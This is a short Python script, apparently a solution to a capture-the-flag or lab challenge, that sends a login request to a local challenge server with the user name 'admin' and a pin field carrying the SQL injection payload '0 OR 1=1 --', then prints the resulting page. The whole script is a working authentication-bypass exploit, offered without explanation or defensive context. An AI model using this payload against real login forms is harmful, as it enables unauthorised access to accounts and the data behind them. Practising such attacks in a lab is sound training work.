import requests

session = requests.Session()
url = "http://challenge.localhost/authentication"
data = {
    "user-handle": "admin",
    "pin": "0 OR 1=1 --"
}
session.post(url, data=data)
response = session.get(url)
print(response.text)
